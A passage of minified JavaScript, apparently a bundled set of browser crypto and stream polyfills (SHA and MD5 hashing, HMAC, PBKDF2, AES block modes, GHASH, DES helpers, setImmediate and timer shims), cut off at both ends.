                this._update(), this._blockOffset = 0 } for (; r < e.length;) i[this._blockOffset++] = e[r++]; for (var a = 0, s = 8 * e.length; s > 0; ++a) this._length[a] += s, (s = this._length[a] / 4294967296 | 0) > 0 && (this._length[a] -= 4294967296 * s); return this }, i.prototype._update = function(e) { throw new Error("_update is not implemented") }, i.prototype.digest = function(e) { if (this._finalized) throw new Error("Digest already called");
            this._finalized = !0; var t = this._digest(); return void 0 !== e && (t = t.toString(e)), t }, i.prototype._digest = function() { throw new Error("_digest is not implemented") }, e.exports = i }).call(t, n(2).Buffer) }, function(e, t) {}, function(e, t, n) { "use strict";

    function i(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

    function r(e, t, n) { e.copy(t, n) } var o = n(1).Buffer;
    e.exports = function() {
        function e() { i(this, e), this.head = null, this.tail = null, this.length = 0 } return e.prototype.push = function(e) { var t = { data: e, next: null };
            this.length > 0 ? this.tail.next = t : this.head = t, this.tail = t, ++this.length }, e.prototype.unshift = function(e) { var t = { data: e, next: this.head };
            0 === this.length && (this.tail = t), this.head = t, ++this.length }, e.prototype.shift = function() { if (0 !== this.length) { var e = this.head.data; return 1 === this.length ? this.head = this.tail = null : this.head = this.head.next, --this.length, e } }, e.prototype.clear = function() { this.head = this.tail = null, this.length = 0 }, e.prototype.join = function(e) { if (0 === this.length) return ""; for (var t = this.head, n = "" + t.data; t = t.next;) n += e + t.data; return n }, e.prototype.concat = function(e) { if (0 === this.length) return o.alloc(0); if (1 === this.length) return this.head.data; for (var t = o.allocUnsafe(e >>> 0), n = this.head, i = 0; n;) r(n.data, t, i), i += n.data.length, n = n.next; return t }, e }() }, function(e, t, n) {
    (function(e) {
        function i(e, t) { this._id = e, this._clearFn = t } var r = Function.prototype.apply;
        t.setTimeout = function() { return new i(r.call(setTimeout, window, arguments), clearTimeout) }, t.setInterval = function() { return new i(r.call(setInterval, window, arguments), clearInterval) }, t.clearTimeout = t.clearInterval = function(e) { e && e.close() }, i.prototype.unref = i.prototype.ref = function() {}, i.prototype.close = function() { this._clearFn.call(window, this._id) }, t.enroll = function(e, t) { clearTimeout(e._idleTimeoutId), e._idleTimeout = t }, t.unenroll = function(e) { clearTimeout(e._idleTimeoutId), e._idleTimeout = -1 }, t._unrefActive = t.active = function(e) { clearTimeout(e._idleTimeoutId); var t = e._idleTimeout;
            t >= 0 && (e._idleTimeoutId = setTimeout(function() { e._onTimeout && e._onTimeout() }, t)) }, n(80), t.setImmediate = "undefined" != typeof self && self.setImmediate || void 0 !== e && e.setImmediate || this && this.setImmediate, t.clearImmediate = "undefined" != typeof self && self.clearImmediate || void 0 !== e && e.clearImmediate || this && this.clearImmediate }).call(t, n(7)) }, function(e, t, n) {
    (function(e, t) {! function(e, n) { "use strict";

            function i(e) { "function" != typeof e && (e = new Function("" + e)); for (var t = new Array(arguments.length - 1), n = 0; n < t.length; n++) t[n] = arguments[n + 1]; var i = { callback: e, args: t }; return u[c] = i, s(c), c++ }

            function r(e) { delete u[e] }

            function o(e) { var t = e.callback,
                    i = e.args; switch (i.length) {
                    case 0:
                        t(); break;
                    case 1:
                        t(i[0]); break;
                    case 2:
                        t(i[0], i[1]); break;
                    case 3:
                        t(i[0], i[1], i[2]); break;
                    default:
                        t.apply(n, i) } }

            function a(e) { if (l) setTimeout(a, 0, e);
                else { var t = u[e]; if (t) { l = !0; try { o(t) } finally { r(e), l = !1 } } } } if (!e.setImmediate) { var s, c = 1,
                    u = {},
                    l = !1,
                    d = e.document,
                    f = Object.getPrototypeOf && Object.getPrototypeOf(e);
                f = f && f.setTimeout ? f : e, "[object process]" === {}.toString.call(e.process) ? function() { s = function(e) { t.nextTick(function() { a(e) }) } }() : function() { if (e.postMessage && !e.importScripts) { var t = !0,
                            n = e.onmessage; return e.onmessage = function() { t = !1 }, e.postMessage("", "*"), e.onmessage = n, t } }() ? function() { var t = "setImmediate$" + Math.random() + "$",
                        n = function(n) { n.source === e && "string" == typeof n.data && 0 === n.data.indexOf(t) && a(+n.data.slice(t.length)) };
                    e.addEventListener ? e.addEventListener("message", n, !1) : e.attachEvent("onmessage", n), s = function(n) { e.postMessage(t + n, "*") } }() : e.MessageChannel ? function() { var e = new MessageChannel;
                    e.port1.onmessage = function(e) { a(e.data) }, s = function(t) { e.port2.postMessage(t) } }() : d && "onreadystatechange" in d.createElement("script") ? function() { var e = d.documentElement;
                    s = function(t) { var n = d.createElement("script");
                        n.onreadystatechange = function() { a(t), n.onreadystatechange = null, e.removeChild(n), n = null }, e.appendChild(n) } }() : function() { s = function(e) { setTimeout(a, 0, e) } }(), f.setImmediate = i, f.clearImmediate = r } }("undefined" == typeof self ? void 0 === e ? this : e : self) }).call(t, n(7), n(8)) }, function(e, t, n) {
    (function(t) {
        function n(e, t) {
            function n() { if (!r) { if (i("throwDeprecation")) throw new Error(t);
                    i("traceDeprecation") ? console.trace(t) : console.warn(t), r = !0 } return e.apply(this, arguments) } if (i("noDeprecation")) return e; var r = !1; return n }

        function i(e) { try { if (!t.localStorage) return !1 } catch (e) { return !1 } var n = t.localStorage[e]; return null != n && "true" === String(n).toLowerCase() } e.exports = n }).call(t, n(7)) }, function(e, t, n) { "use strict";

    function i(e) { if (!(this instanceof i)) return new i(e);
        r.call(this, e) } e.exports = i; var r = n(41),
        o = n(14);
    o.inherits = n(0), o.inherits(i, r), i.prototype._transform = function(e, t, n) { n(null, e) } }, function(e, t, n) { e.exports = n(29) }, function(e, t, n) { e.exports = n(10) }, function(e, t, n) { e.exports = n(28).Transform }, function(e, t, n) { e.exports = n(28).PassThrough }, function(e, t, n) {
    function i() { this.init(), this._w = d, c.call(this, 64, 56) }

    function r(e) { return e << 5 | e >>> 27 }

    function o(e) { return e << 30 | e >>> 2 }

    function a(e, t, n, i) { return 0 === e ? t & n | ~t & i : 2 === e ? t & n | t & i | n & i : t ^ n ^ i } var s = n(0),
        c = n(12),
        u = n(1).Buffer,
        l = [1518500249, 1859775393, -1894007588, -899497514],
        d = new Array(80);
    s(i, c), i.prototype.init = function() { return this._a = 1732584193, this._b = 4023233417, this._c = 2562383102, this._d = 271733878, this._e = 3285377520, this }, i.prototype._update = function(e) { for (var t = this._w, n = 0 | this._a, i = 0 | this._b, s = 0 | this._c, c = 0 | this._d, u = 0 | this._e, d = 0; d < 16; ++d) t[d] = e.readInt32BE(4 * d); for (; d < 80; ++d) t[d] = t[d - 3] ^ t[d - 8] ^ t[d - 14] ^ t[d - 16]; for (var f = 0; f < 80; ++f) { var h = ~~(f / 20),
                p = r(n) + a(h, i, s, c) + u + t[f] + l[h] | 0;
            u = c, c = s, s = o(i), i = n, n = p } this._a = n + this._a | 0, this._b = i + this._b | 0, this._c = s + this._c | 0, this._d = c + this._d | 0, this._e = u + this._e | 0 }, i.prototype._hash = function() { var e = u.allocUnsafe(20); return e.writeInt32BE(0 | this._a, 0), e.writeInt32BE(0 | this._b, 4), e.writeInt32BE(0 | this._c, 8), e.writeInt32BE(0 | this._d, 12), e.writeInt32BE(0 | this._e, 16), e }, e.exports = i }, function(e, t, n) {
    function i() { this.init(), this._w = f, u.call(this, 64, 56) }

    function r(e) { return e << 1 | e >>> 31 }

    function o(e) { return e << 5 | e >>> 27 }

    function a(e) { return e << 30 | e >>> 2 }

    function s(e, t, n, i) { return 0 === e ? t & n | ~t & i : 2 === e ? t & n | t & i | n & i : t ^ n ^ i } var c = n(0),
        u = n(12),
        l = n(1).Buffer,
        d = [1518500249, 1859775393, -1894007588, -899497514],
        f = new Array(80);
    c(i, u), i.prototype.init = function() { return this._a = 1732584193, this._b = 4023233417, this._c = 2562383102, this._d = 271733878, this._e = 3285377520, this }, i.prototype._update = function(e) { for (var t = this._w, n = 0 | this._a, i = 0 | this._b, c = 0 | this._c, u = 0 | this._d, l = 0 | this._e, f = 0; f < 16; ++f) t[f] = e.readInt32BE(4 * f); for (; f < 80; ++f) t[f] = r(t[f - 3] ^ t[f - 8] ^ t[f - 14] ^ t[f - 16]); for (var h = 0; h < 80; ++h) { var p = ~~(h / 20),
                b = o(n) + s(p, i, c, u) + l + t[h] + d[p] | 0;
            l = u, u = c, c = a(i), i = n, n = b } this._a = n + this._a | 0, this._b = i + this._b | 0, this._c = c + this._c | 0, this._d = u + this._d | 0, this._e = l + this._e | 0 }, i.prototype._hash = function() { var e = l.allocUnsafe(20); return e.writeInt32BE(0 | this._a, 0), e.writeInt32BE(0 | this._b, 4), e.writeInt32BE(0 | this._c, 8), e.writeInt32BE(0 | this._d, 12), e.writeInt32BE(0 | this._e, 16), e }, e.exports = i }, function(e, t, n) {
    function i() { this.init(), this._w = c, a.call(this, 64, 56) } var r = n(0),
        o = n(42),
        a = n(12),
        s = n(1).Buffer,
        c = new Array(64);
    r(i, o), i.prototype.init = function() { return this._a = 3238371032, this._b = 914150663, this._c = 812702999, this._d = 4144912697, this._e = 4290775857, this._f = 1750603025, this._g = 1694076839, this._h = 3204075428, this }, i.prototype._hash = function() { var e = s.allocUnsafe(28); return e.writeInt32BE(this._a, 0), e.writeInt32BE(this._b, 4), e.writeInt32BE(this._c, 8), e.writeInt32BE(this._d, 12), e.writeInt32BE(this._e, 16), e.writeInt32BE(this._f, 20), e.writeInt32BE(this._g, 24), e }, e.exports = i }, function(e, t, n) {
    function i() { this.init(), this._w = c, a.call(this, 128, 112) } var r = n(0),
        o = n(43),
        a = n(12),
        s = n(1).Buffer,
        c = new Array(160);
    r(i, o), i.prototype.init = function() { return this._ah = 3418070365, this._bh = 1654270250, this._ch = 2438529370, this._dh = 355462360, this._eh = 1731405415, this._fh = 2394180231, this._gh = 3675008525, this._hh = 1203062813, this._al = 3238371032, this._bl = 914150663, this._cl = 812702999, this._dl = 4144912697, this._el = 4290775857, this._fl = 1750603025, this._gl = 1694076839, this._hl = 3204075428, this }, i.prototype._hash = function() {
        function e(e, n, i) { t.writeInt32BE(e, i), t.writeInt32BE(n, i + 4) } var t = s.allocUnsafe(48); return e(this._ah, this._al, 0), e(this._bh, this._bl, 8), e(this._ch, this._cl, 16), e(this._dh, this._dl, 24), e(this._eh, this._el, 32), e(this._fh, this._fl, 40), t }, e.exports = i }, function(e, t, n) { "use strict";

    function i(e, t) { a.call(this, "digest"), "string" == typeof t && (t = o.from(t)), this._alg = e, this._key = t, t.length > c ? t = e(t) : t.length < c && (t = o.concat([t, s], c)); for (var n = this._ipad = o.allocUnsafe(c), i = this._opad = o.allocUnsafe(c), r = 0; r < c; r++) n[r] = 54 ^ t[r], i[r] = 92 ^ t[r];
        this._hash = [n] } var r = n(0),
        o = n(1).Buffer,
        a = n(9),
        s = o.alloc(128),
        c = 64;
    r(i, a), i.prototype._update = function(e) { this._hash.push(e) }, i.prototype._final = function() { var e = this._alg(o.concat(this._hash)); return this._alg(o.concat([this._opad, e])) }, e.exports = i }, function(e, t, n) { e.exports = n(45) }, function(e, t, n) {
    (function(t, i) {
        function r(e) { if (t.process && !t.process.browser) return Promise.resolve(!1); if (!f || !f.importKey || !f.deriveBits) return Promise.resolve(!1); if (void 0 !== p[e]) return p[e];
            s = s || d.alloc(8); var n = o(s, s, 10, 128, e).then(function() { return !0 }).catch(function() { return !1 }); return p[e] = n, n }

        function o(e, t, n, i, r) { return f.importKey("raw", e, { name: "PBKDF2" }, !1, ["deriveBits"]).then(function(e) { return f.deriveBits({ name: "PBKDF2", salt: t, iterations: n, hash: { name: r } }, e, i << 3) }).then(function(e) { return d.from(e) }) }

        function a(e, t) { e.then(function(e) { i.nextTick(function() { t(null, e) }) }, function(e) { i.nextTick(function() { t(e) }) }) } var s, c = n(47),
            u = n(48),
            l = n(49),
            d = n(1).Buffer,
            f = t.crypto && t.crypto.subtle,
            h = { sha: "SHA-1", "sha-1": "SHA-1", sha1: "SHA-1", sha256: "SHA-256", "sha-256": "SHA-256", sha384: "SHA-384", "sha-384": "SHA-384", "sha-512": "SHA-512", sha512: "SHA-512" },
            p = [];
        e.exports = function(e, n, s, f, p, b) { if (d.isBuffer(e) || (e = d.from(e, u)), d.isBuffer(n) || (n = d.from(n, u)), c(s, f), "function" == typeof p && (b = p, p = void 0), "function" != typeof b) throw new Error("No callback provided to pbkdf2");
            p = p || "sha1"; var m = h[p.toLowerCase()]; if (!m || "function" != typeof t.Promise) return i.nextTick(function() { var t; try { t = l(e, n, s, f, p) } catch (e) { return b(e) } b(null, t) });
            a(r(m).then(function(t) { return t ? o(e, n, s, f, m) : l(e, n, s, f, p) }), b) } }).call(t, n(7), n(8)) }, function(e, t, n) {
    function i(e, t) { var n, i; if (e = e.toLowerCase(), f[e]) n = f[e].key, i = f[e].iv;
        else { if (!d[e]) throw new TypeError("invalid suite type");
            n = 8 * d[e].key, i = d[e].iv } var r = c(t, !1, n, i); return o(e, r.key, r.iv) }

    function r(e, t) { var n, i; if (e = e.toLowerCase(), f[e]) n = f[e].key, i = f[e].iv;
        else { if (!d[e]) throw new TypeError("invalid suite type");
            n = 8 * d[e].key, i = d[e].iv } var r = c(t, !1, n, i); return a(e, r.key, r.iv) }

    function o(e, t, n) { if (e = e.toLowerCase(), f[e]) return u.createCipheriv(e, t, n); if (d[e]) return new l({ key: t, iv: n, mode: e }); throw new TypeError("invalid suite type") }

    function a(e, t, n) { if (e = e.toLowerCase(), f[e]) return u.createDecipheriv(e, t, n); if (d[e]) return new l({ key: t, iv: n, mode: e, decrypt: !0 }); throw new TypeError("invalid suite type") }

    function s() { return Object.keys(d).concat(u.getCiphers()) } var c = n(21),
        u = n(32),
        l = n(106),
        d = n(112),
        f = n(33);
    t.createCipher = t.Cipher = i, t.createCipheriv = t.Cipheriv = o, t.createDecipher = t.Decipher = r, t.createDecipheriv = t.Decipheriv = a, t.listCiphers = t.getCiphers = s }, function(e, t, n) { "use strict";
    (function(t) {
        function i() { l.call(this, 64), this._a = 1732584193, this._b = 4023233417, this._c = 2562383102, this._d = 271733878 }

        function r(e, t) { return e << t | e >>> 32 - t }

        function o(e, t, n, i, o, a, s) { return r(e + (t & n | ~t & i) + o + a | 0, s) + t | 0 }

        function a(e, t, n, i, o, a, s) { return r(e + (t & i | n & ~i) + o + a | 0, s) + t | 0 }

        function s(e, t, n, i, o, a, s) { return r(e + (t ^ n ^ i) + o + a | 0, s) + t | 0 }

        function c(e, t, n, i, o, a, s) { return r(e + (n ^ (t | ~i)) + o + a | 0, s) + t | 0 } var u = n(0),
            l = n(96),
            d = new Array(16);
        u(i, l), i.prototype._update = function() { for (var e = d, t = 0; t < 16; ++t) e[t] = this._block.readInt32LE(4 * t); var n = this._a,
                i = this._b,
                r = this._c,
                u = this._d;
            n = o(n, i, r, u, e[0], 3614090360, 7), u = o(u, n, i, r, e[1], 3905402710, 12), r = o(r, u, n, i, e[2], 606105819, 17), i = o(i, r, u, n, e[3], 3250441966, 22), n = o(n, i, r, u, e[4], 4118548399, 7), u = o(u, n, i, r, e[5], 1200080426, 12), r = o(r, u, n, i, e[6], 2821735955, 17), i = o(i, r, u, n, e[7], 4249261313, 22), n = o(n, i, r, u, e[8], 1770035416, 7), u = o(u, n, i, r, e[9], 2336552879, 12), r = o(r, u, n, i, e[10], 4294925233, 17), i = o(i, r, u, n, e[11], 2304563134, 22), n = o(n, i, r, u, e[12], 1804603682, 7), u = o(u, n, i, r, e[13], 4254626195, 12), r = o(r, u, n, i, e[14], 2792965006, 17), i = o(i, r, u, n, e[15], 1236535329, 22), n = a(n, i, r, u, e[1], 4129170786, 5), u = a(u, n, i, r, e[6], 3225465664, 9), r = a(r, u, n, i, e[11], 643717713, 14), i = a(i, r, u, n, e[0], 3921069994, 20), n = a(n, i, r, u, e[5], 3593408605, 5), u = a(u, n, i, r, e[10], 38016083, 9), r = a(r, u, n, i, e[15], 3634488961, 14), i = a(i, r, u, n, e[4], 3889429448, 20), n = a(n, i, r, u, e[9], 568446438, 5), u = a(u, n, i, r, e[14], 3275163606, 9), r = a(r, u, n, i, e[3], 4107603335, 14), i = a(i, r, u, n, e[8], 1163531501, 20), n = a(n, i, r, u, e[13], 2850285829, 5), u = a(u, n, i, r, e[2], 4243563512, 9), r = a(r, u, n, i, e[7], 1735328473, 14), i = a(i, r, u, n, e[12], 2368359562, 20), n = s(n, i, r, u, e[5], 4294588738, 4), u = s(u, n, i, r, e[8], 2272392833, 11), r = s(r, u, n, i, e[11], 1839030562, 16), i = s(i, r, u, n, e[14], 4259657740, 23), n = s(n, i, r, u, e[1], 2763975236, 4), u = s(u, n, i, r, e[4], 1272893353, 11), r = s(r, u, n, i, e[7], 4139469664, 16), i = s(i, r, u, n, e[10], 3200236656, 23), n = s(n, i, r, u, e[13], 681279174, 4), u = s(u, n, i, r, e[0], 3936430074, 11), r = s(r, u, n, i, e[3], 3572445317, 16), i = s(i, r, u, n, e[6], 76029189, 23), n = s(n, i, r, u, e[9], 3654602809, 4), u = s(u, n, i, r, e[12], 3873151461, 11), r = s(r, u, n, i, e[15], 530742520, 16), i = s(i, r, u, n, e[2], 3299628645, 23), n = c(n, i, r, u, e[0], 4096336452, 6), u = c(u, n, i, r, e[7], 1126891415, 10), r = c(r, u, n, i, e[14], 2878612391, 15), i = c(i, r, u, n, e[5], 4237533241, 21), n = c(n, i, r, u, e[12], 1700485571, 6), u = c(u, n, i, r, e[3], 2399980690, 10), r = c(r, u, n, i, e[10], 4293915773, 15), i = c(i, r, u, n, e[1], 2240044497, 21), n = c(n, i, r, u, e[8], 1873313359, 6), u = c(u, n, i, r, e[15], 4264355552, 10), r = c(r, u, n, i, e[6], 2734768916, 15), i = c(i, r, u, n, e[13], 1309151649, 21), n = c(n, i, r, u, e[4], 4149444226, 6), u = c(u, n, i, r, e[11], 3174756917, 10), r = c(r, u, n, i, e[2], 718787259, 15), i = c(i, r, u, n, e[9], 3951481745, 21), this._a = this._a + n | 0, this._b = this._b + i | 0, this._c = this._c + r | 0, this._d = this._d + u | 0 }, i.prototype._digest = function() { this._block[this._blockOffset++] = 128, this._blockOffset > 56 && (this._block.fill(0, this._blockOffset, 64), this._update(), this._blockOffset = 0), this._block.fill(0, this._blockOffset, 56), this._block.writeUInt32LE(this._length[0], 56), this._block.writeUInt32LE(this._length[1], 60), this._update(); var e = new t(16); return e.writeInt32LE(this._a, 0), e.writeInt32LE(this._b, 4), e.writeInt32LE(this._c, 8), e.writeInt32LE(this._d, 12), e }, e.exports = i }).call(t, n(2).Buffer) }, function(e, t, n) { "use strict";

    function i(e, t) { if (!o.isBuffer(e) && "string" != typeof e) throw new TypeError(t + " must be a string or a buffer") }

    function r(e) { a.call(this), this._block = o.allocUnsafe(e), this._blockSize = e, this._blockOffset = 0, this._length = [0, 0, 0, 0], this._finalized = !1 } var o = n(1).Buffer,
        a = n(19).Transform;
    n(0)(r, a), r.prototype._transform = function(e, t, n) { var i = null; try { this.update(e, t) } catch (e) { i = e } n(i) }, r.prototype._flush = function(e) { var t = null; try { this.push(this.digest()) } catch (e) { t = e } e(t) }, r.prototype.update = function(e, t) { if (i(e, "Data"), this._finalized) throw new Error("Digest already called");
        o.isBuffer(e) || (e = o.from(e, t)); for (var n = this._block, r = 0; this._blockOffset + e.length - r >= this._blockSize;) { for (var a = this._blockOffset; a < this._blockSize;) n[a++] = e[r++];
            this._update(), this._blockOffset = 0 } for (; r < e.length;) n[this._blockOffset++] = e[r++]; for (var s = 0, c = 8 * e.length; c > 0; ++s) this._length[s] += c, (c = this._length[s] / 4294967296 | 0) > 0 && (this._length[s] -= 4294967296 * c); return this }, r.prototype._update = function() { throw new Error("_update is not implemented") }, r.prototype.digest = function(e) { if (this._finalized) throw new Error("Digest already called");
        this._finalized = !0; var t = this._digest();
        void 0 !== e && (t = t.toString(e)), this._block.fill(0), this._blockOffset = 0; for (var n = 0; n < 4; ++n) this._length[n] = 0; return t }, r.prototype._digest = function() { throw new Error("_digest is not implemented") }, e.exports = r }, function(e, t, n) {
    function i(e, t, n) { d.call(this), this._cache = new r, this._cipher = new f.AES(t), this._prev = u.from(n), this._mode = e, this._autopadding = !0 }

    function r() { this.cache = u.allocUnsafe(0) }

    function o(e, t, n) { var r = s[e.toLowerCase()]; if (!r) throw new TypeError("invalid suite type"); if ("string" == typeof t && (t = u.from(t)), t.length !== r.key / 8) throw new TypeError("invalid key length " + t.length); if ("string" == typeof n && (n = u.from(n)), "GCM" !== r.mode && n.length !== r.iv) throw new TypeError("invalid iv length " + n.length); return "stream" === r.type ? new l(r.module, t, n) : "auth" === r.type ? new c(r.module, t, n) : new i(r.module, t, n) }

    function a(e, t) { var n = s[e.toLowerCase()]; if (!n) throw new TypeError("invalid suite type"); var i = h(t, !1, n.key, n.iv); return o(e, i.key, i.iv) } var s = n(33),
        c = n(53),
        u = n(1).Buffer,
        l = n(54),
        d = n(9),
        f = n(22),
        h = n(21);
    n(0)(i, d), i.prototype._update = function(e) { this._cache.add(e); for (var t, n, i = []; t = this._cache.get();) n = this._mode.encrypt(this, t), i.push(n); return u.concat(i) }; var p = u.alloc(16, 16);
    i.prototype._final = function() { var e = this._cache.flush(); if (this._autopadding) return e = this._mode.encrypt(this, e), this._cipher.scrub(), e; if (!e.equals(p)) throw this._cipher.scrub(), new Error("data not multiple of block length") }, i.prototype.setAutoPadding = function(e) { return this._autopadding = !!e, this }, r.prototype.add = function(e) { this.cache = u.concat([this.cache, e]) }, r.prototype.get = function() { if (this.cache.length > 15) { var e = this.cache.slice(0, 16); return this.cache = this.cache.slice(16), e } return null }, r.prototype.flush = function() { for (var e = 16 - this.cache.length, t = u.allocUnsafe(e), n = -1; ++n < e;) t.writeUInt8(e, n); return u.concat([this.cache, t]) }, t.createCipheriv = o, t.createCipher = a }, function(e, t) { t.encrypt = function(e, t) { return e._cipher.encryptBlock(t) }, t.decrypt = function(e, t) { return e._cipher.decryptBlock(t) } }, function(e, t, n) { var i = n(15);
    t.encrypt = function(e, t) { var n = i(t, e._prev); return e._prev = e._cipher.encryptBlock(n), e._prev }, t.decrypt = function(e, t) { var n = e._prev;
        e._prev = t; var r = e._cipher.decryptBlock(t); return i(r, n) } }, function(e, t, n) {
    function i(e, t, n) { var i = t.length,
            a = o(t, e._cache); return e._cache = e._cache.slice(i), e._prev = r.concat([e._prev, n ? t : a]), a } var r = n(1).Buffer,
        o = n(15);
    t.encrypt = function(e, t, n) { for (var o, a = r.allocUnsafe(0); t.length;) { if (0 === e._cache.length && (e._cache = e._cipher.encryptBlock(e._prev), e._prev = r.allocUnsafe(0)), !(e._cache.length <= t.length)) { a = r.concat([a, i(e, t, n)]); break } o = e._cache.length, a = r.concat([a, i(e, t.slice(0, o), n)]), t = t.slice(o) } return a } }, function(e, t, n) {
    function i(e, t, n) { var i = e._cipher.encryptBlock(e._prev),
            o = i[0] ^ t; return e._prev = r.concat([e._prev.slice(1), r.from([n ? t : o])]), o } var r = n(1).Buffer;
    t.encrypt = function(e, t, n) { for (var o = t.length, a = r.allocUnsafe(o), s = -1; ++s < o;) a[s] = i(e, t[s], n); return a } }, function(e, t, n) {
    function i(e, t, n) { for (var i, o, a, s = -1, c = 0; ++s < 8;) i = e._cipher.encryptBlock(e._prev), o = t & 1 << 7 - s ? 128 : 0, a = i[0] ^ o, c += (128 & a) >> s % 8, e._prev = r(e._prev, n ? o : a); return c }

    function r(e, t) { var n = e.length,
            i = -1,
            r = o.allocUnsafe(e.length); for (e = o.concat([e, o.from([t])]); ++i < n;) r[i] = e[i] << 1 | e[i + 1] >> 7; return r } var o = n(1).Buffer;
    t.encrypt = function(e, t, n) { for (var r = t.length, a = o.allocUnsafe(r), s = -1; ++s < r;) a[s] = i(e, t[s], n); return a } }, function(e, t, n) {
    (function(e) {
        function i(e) { return e._prev = e._cipher.encryptBlock(e._prev), e._prev } var r = n(15);
        t.encrypt = function(t, n) { for (; t._cache.length < n.length;) t._cache = e.concat([t._cache, i(t)]); var o = t._cache.slice(0, n.length); return t._cache = t._cache.slice(n.length), r(n, o) } }).call(t, n(2).Buffer) }, function(e, t, n) {
    function i(e) { return [e.readUInt32BE(0), e.readUInt32BE(4), e.readUInt32BE(8), e.readUInt32BE(12)] }

    function r(e) { var t = a.allocUnsafe(16); return t.writeUInt32BE(e[0] >>> 0, 0), t.writeUInt32BE(e[1] >>> 0, 4), t.writeUInt32BE(e[2] >>> 0, 8), t.writeUInt32BE(e[3] >>> 0, 12), t }

    function o(e) { this.h = e, this.state = a.alloc(16, 0), this.cache = a.allocUnsafe(0) } var a = n(1).Buffer,
        s = a.alloc(16, 0);
    o.prototype.ghash = function(e) { for (var t = -1; ++t < e.length;) this.state[t] ^= e[t];
        this._multiply() }, o.prototype._multiply = function() { for (var e, t, n, o = i(this.h), a = [0, 0, 0, 0], s = -1; ++s < 128;) { for (t = 0 != (this.state[~~(s / 8)] & 1 << 7 - s % 8), t && (a[0] ^= o[0], a[1] ^= o[1], a[2] ^= o[2], a[3] ^= o[3]), n = 0 != (1 & o[3]), e = 3; e > 0; e--) o[e] = o[e] >>> 1 | (1 & o[e - 1]) << 31;
            o[0] = o[0] >>> 1, n && (o[0] = o[0] ^ 225 << 24) } this.state = r(a) }, o.prototype.update = function(e) { this.cache = a.concat([this.cache, e]); for (var t; this.cache.length >= 16;) t = this.cache.slice(0, 16), this.cache = this.cache.slice(16), this.ghash(t) }, o.prototype.final = function(e, t) { return this.cache.length && this.ghash(a.concat([this.cache, s], 16)), this.ghash(r([0, e, 0, t])), this.state }, e.exports = o }, function(e, t, n) {
    function i(e, t, n) { f.call(this), this._cache = new r, this._last = void 0, this._cipher = new h.AES(t), this._prev = u.from(n), this._mode = e, this._autopadding = !0 }

    function r() { this.cache = u.allocUnsafe(0) }

    function o(e) { for (var t = e[15], n = -1; ++n < t;)
            if (e[n + (16 - t)] !== t) throw new Error("unable to decrypt data"); if (16 !== t) return e.slice(0, 16 - t) }

    function a(e, t, n) { var r = l[e.toLowerCase()]; if (!r) throw new TypeError("invalid suite type"); if ("string" == typeof n && (n = u.from(n)), "GCM" !== r.mode && n.length !== r.iv) throw new TypeError("invalid iv length " + n.length); if ("string" == typeof t && (t = u.from(t)), t.length !== r.key / 8) throw new TypeError("invalid key length " + t.length); return "stream" === r.type ? new d(r.module, t, n, !0) : "auth" === r.type ? new c(r.module, t, n, !0) : new i(r.module, t, n) }

    function s(e, t) { var n = l[e.toLowerCase()]; if (!n) throw new TypeError("invalid suite type"); var i = p(t, !1, n.key, n.iv); return a(e, i.key, i.iv) } var c = n(53),
        u = n(1).Buffer,
        l = n(33),
        d = n(54),
        f = n(9),
        h = n(22),
        p = n(21);
    n(0)(i, f), i.prototype._update = function(e) { this._cache.add(e); for (var t, n, i = []; t = this._cache.get(this._autopadding);) n = this._mode.decrypt(this, t), i.push(n); return u.concat(i) }, i.prototype._final = function() { var e = this._cache.flush(); if (this._autopadding) return o(this._mode.decrypt(this, e)); if (e) throw new Error("data not multiple of block length") }, i.prototype.setAutoPadding = function(e) { return this._autopadding = !!e, this }, r.prototype.add = function(e) { this.cache = u.concat([this.cache, e]) }, r.prototype.get = function(e) { var t; if (e) { if (this.cache.length > 16) return t = this.cache.slice(0, 16), this.cache = this.cache.slice(16), t } else if (this.cache.length >= 16) return t = this.cache.slice(0, 16), this.cache = this.cache.slice(16), t; return null }, r.prototype.flush = function() { if (this.cache.length) return this.cache }, t.createDecipher = s, t.createDecipheriv = a }, function(e, t, n) {
    (function(t) {
        function i(e) { r.call(this); var n, i = e.mode.toLowerCase(),
                o = s[i];
            n = e.decrypt ? "decrypt" : "encrypt"; var a = e.key; "des-ede" !== i && "des-ede-cbc" !== i || (a = t.concat([a, a.slice(0, 8)])); var c = e.iv;
            this._des = o.create({ key: a, iv: c, type: n }) } var r = n(9),
            o = n(34),
            a = n(0),
            s = { "des-ede3-cbc": o.CBC.instantiate(o.EDE), "des-ede3": o.EDE, "des-ede-cbc": o.CBC.instantiate(o.EDE), "des-ede": o.EDE, "des-cbc": o.CBC.instantiate(o.DES), "des-ecb": o.DES };
        s.des = s["des-cbc"], s.des3 = s["des-ede3-cbc"], e.exports = i, a(i, r), i.prototype._update = function(e) { return new t(this._des.update(e)) }, i.prototype._final = function() { return new t(this._des.final()) } }).call(t, n(2).Buffer) }, function(e, t, n) { "use strict";
    t.readUInt32BE = function(e, t) { return (e[0 + t] << 24 | e[1 + t] << 16 | e[2 + t] << 8 | e[3 + t]) >>> 0 }, t.writeUInt32BE = function(e, t, n) { e[0 + n] = t >>> 24, e[1 + n] = t >>> 16 & 255, e[2 + n] = t >>> 8 & 255, e[3 + n] = 255 & t }, t.ip = function(e, t, n, i) { for (var r = 0, o = 0, a = 6; a >= 0; a -= 2) { for (var s = 0; s <= 24; s += 8) r <<= 1, r |= t >>> s + a & 1; for (var s = 0; s <= 24; s += 8) r <<= 1, r |= e >>> s + a & 1 } for (var a = 6; a >= 0; a -= 2) { for (var s = 1; s <= 25; s += 8) o <<= 1, o |= t >>> s + a & 1; for (var s = 1; s <= 25; s += 8) o <<= 1, o |= e >>> s + a & 1 } n[i + 0] = r >>> 0, n[i + 1] = o >>> 0 }, t.rip = function(e, t, n, i) { for (var r = 0, o = 0, a = 0; a < 4; a++)
            for (var s = 24; s >= 0; s -= 8) r <<= 1, r |= t >>> s + a & 1, r <<= 1, r |= e >>> s + a & 1; for (var a = 4; a < 8; a++)
            for (var s = 24; s >= 0; s -= 8) o <<= 1, o |= t >>> s + a & 1, o <<= 1, o |= e >>> s + a & 1;
